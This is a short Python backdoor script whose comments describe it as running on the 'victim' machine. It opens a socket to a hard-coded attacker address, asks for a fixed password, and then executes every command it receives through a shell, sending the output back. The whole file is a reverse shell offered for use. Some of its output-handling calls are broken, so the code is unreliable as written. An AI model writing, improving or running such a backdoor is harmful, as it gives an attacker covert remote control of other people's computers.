#in the victim comp
import subprocess#execute commands
import socket

host='192.168.56.1'#attack ip
port=55555
passwrd='ciao'#protect ur backdoor

def login():
    s.send("Login: ".encode())
    psw=s.recv(4096).decode()
    
    if psw != passwrd:#rimuove spazi all'inizio e alla fine
        login()
    else:
        s.send("Connected".encode())
        shell()

def shell():
    while True:
        data=s.recv(4096).decode()
        
        if data.strip()=='kill':
            break
        
        proc=subprocess.run(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)#mi fa fare tutti i comandi
        output=proc.stdout.read()+proc.stderr.read()#riceve output e errore
        s.send(output.encode())

s=socket.socket()
s.connect((host, port))
login()